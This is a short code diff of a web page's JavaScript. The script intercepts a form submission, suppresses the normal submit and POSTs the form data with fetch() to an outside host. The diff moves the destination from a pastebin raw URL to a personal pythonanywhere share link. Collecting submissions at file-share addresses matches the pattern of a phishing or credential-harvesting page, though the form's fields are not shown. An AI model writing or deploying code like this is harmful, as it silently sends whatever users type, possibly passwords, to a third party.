@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function() {
         e.preventDefault();
         const formData = new FormData(form);
 
-        fetch("https://pastebin.com/raw/nV7VB8zM", {
+        fetch("https://www.pythonanywhere.com/user/silverx/shares/1e4e0bfb4e6043c69c46fa9070f87e73/", {
             method: "POST",
             body: formData
         })
